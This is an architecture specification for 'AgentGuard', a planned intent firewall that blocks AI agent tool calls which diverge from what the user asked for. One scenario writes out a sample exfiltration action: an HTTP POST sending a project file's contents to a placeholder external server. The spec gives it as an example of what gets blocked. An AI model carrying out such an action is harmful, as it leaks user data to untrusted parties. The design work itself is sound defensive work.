# AgentGuard Architecture Specification

> **Phase 1 Document**  
> *Status: Architectural Blueprint & Foundational Specification*  
> *Note: ML, Risk, and Policy engine modules are planned for subsequent phases and are not yet active in Phase 1.*

---

## 1. High-Level Overview

**AgentGuard** is a **Context-Aware AI Intent Firewall**. It sits directly between an autonomous AI agent (or LLM application) and external execution environments (such as APIs, databases, file systems, code execution sandboxes, and web scrapers).

Traditional security firewalls inspect raw IP packets or API signatures. AgentGuard inspects **semantic intent and operational context**: it asks whether what the AI agent is about to do actually makes sense given what the user asked it to do.

---

## 2. High-Level Flow Diagram

```text
       ┌────────────────────────┐
       │   USER / APPLICATION   │
       └───────────┬────────────┘
                   │ User Prompts & Directives
                   ▼
       ┌────────────────────────┐
       │        AI AGENT        │  (LLM reasoning, planning, tool-calling)
       └───────────┬────────────┘
                   │ Proposed Action Payload
                   ▼
┌─────────────────────────────────────────────────────────────┐
│                 AGENTGUARD SECURITY GATEWAY                 │
│                                                             │
│  ┌─────────────────┐  ┌────────────────┐  ┌──────────────┐  │
│  │  Intent Engine  │  │ Context Engine │  │Action Parser │  │
│  └────────┬────────┘  └───────┬────────┘  └──────┬───────┘  │
│           │                   │                  │          │
│           └─────────────┬─────┴──────────────────┘          │
│                         ▼                                   │
│           ┌────────────────────────────┐                    │
│           │   Risk Assessment Engine   │                    │
│           └─────────────┬──────────────┘                    │
│                         ▼                                   │
│           ┌────────────────────────────┐                    │
│           │       Policy Engine        │                    │
│           └─────────────┬──────────────┘                    │
└─────────────────────────┼───────────────────────────────────┘
                          │
                          ▼
            [ ALLOW / REVIEW / BLOCK ]
                          │
         ┌────────────────┴──────────────┐
         │                               │
    (If ALLOWED)            (If REVIEW or BLOCKED)
         ▼                               ▼
┌──────────────────┐           ┌────────────────────┐
│ ACTION EXECUTION │           │ HALT & ALERT USER  │
└────────┬─────────┘           └─────────┬──────────┘
         │                               │
         └───────────────┬───────────────┘
                         ▼
        ┌─────────────────────────────────┐
        │     AUDIT LOG + EXPLANATION     │
        └─────────────────────────────────┘
```

---

## 3. Core Component Breakdown

### 3.1. User / Application
The starting point where an authorized user or upstream client supplies instructions, tasks, or system prompts (e.g., *"Summarize our quarterly marketing expenditure"*).

### 3.2. AI Agent
The autonomous LLM or agent runtime (e.g., LangChain, AutoGen, LlamaIndex, custom ReAct agent). The agent reasons over the user prompt and selects tools/actions (e.g., file reads, shell commands, network requests) to accomplish the goal.

### 3.3. AgentGuard Security Gateway
The interception proxy or middleware layer. Before any tool execution or external call is dispatched to the operating system or network, the call is sent to AgentGuard for validation.

### 3.4. Perception & Extraction Layer
* **Intent Engine:** Interprets the user's primary objective, scope, and semantic boundaries using natural language understanding.
* **Context Engine:** Tracks the operational context, including who the user is, environment parameters, session history, previous actions taken, and active system state.
* **Action Parser:** Dissects the agent's proposed call into atomic elements:
  * *Verb/Action:* e.g., `READ`, `WRITE`, `EXECUTE`, `HTTP_POST`, `DELETE`.
  * *Target Resource:* e.g., `/data/reports.csv`, `https://api.external.com/upload`.
  * *Payload / Parameters:* Data being transferred or arguments supplied.

### 3.5. Risk Assessment Engine
Combines the parsed intent, context, and requested action to generate a multi-dimensional risk score. Factors include:
* **Semantic distance** between user intent and proposed action.
* **Data sensitivity** (presence of PII, credentials, or proprietary files).
* **Blast radius** (irreversible destructive actions vs. read-only queries).
* **Behavioral anomaly score** (deviations from typical tool sequences).

### 3.6. Policy Engine
Evaluates the calculated risk against deterministic security rules, role-based access control (RBAC), and organization policies. It maps findings to a final enforcement verdict.

### 3.7. The Triad Decision Model
Every proposed action results in one of three decisions:
* **ALLOW:** The action is consistent with user intent and complies with security policies. The gateway forwards the action to execution without friction.
* **REVIEW:** The action has moderate risk, unexpected side effects, or borderline intent alignment. Execution is temporarily suspended, and human-in-the-loop (HITL) approval is requested.
* **BLOCK:** The action represents a clear threat, policy violation, prompt injection exploitation, or unauthorized exfiltration. Execution is immediately terminated.

### 3.8. Audit Log + Explanation
Every interception produces an immutable audit record containing:
* Timestamp and unique session ID.
* User intent and agent reasoning trace.
* Action payload and target resource.
* Plain-language explanation justifying why the action was Allowed, Queued for Review, or Blocked.

---

## 4. Intent → Context → Action Consistency

The core principle behind AgentGuard is **Intent-Context-Action Consistency**:

$$\text{Consistency} = f(\text{User Intent}, \text{Operational Context}, \text{Requested Action})$$

An action cannot be judged purely by its syntax; it must be evaluated in relation to what was requested.

### Real-World Consistency Example

* **User Intent:**  
  `"Prepare my monthly project report."`

* **Operational Context:**  
  User has regular developer permissions; project workspace directory is `/workspace/project-alpha`.

#### Scenario A: Safe Action (Consistent)
* **Agent Action:** Read local file `project_data.csv`.
* **Evaluation:** Reading local project metrics aligns directly with compiling a project report.
* **Decision:** **`ALLOW`**

#### Scenario B: Suspicious / Dangerous Action (Inconsistent)
* **Agent Action:** `HTTP POST https://unknown-external-server.xyz/upload` with body containing contents of `project_data.csv`.
* **Evaluation:** The user asked for a report to be *prepared*, not *exfiltrated* to an untrusted external endpoint. This represents semantic divergence, possible prompt injection, or data leakage.
* **Decision:** **`BLOCK`** (or **`REVIEW`** if configured with strict human-in-the-loop oversight).

---

## 5. Development Roadmap Across Phases

* **Phase 1 (Current):** Foundational architecture, repository layout, baseline FastAPI endpoints, hygiene checks, and testing harness.
* **Phase 2 (Upcoming):** Data models, schemas for Intent/Context/Action payloads, and deterministic policy rule engine.
* **Phase 3:** Machine learning integration (semantic intent embedding, similarity scoring, anomaly detection).
* **Phase 4:** Human-in-the-loop review dashboard (React/Vite) and agent proxy integration.
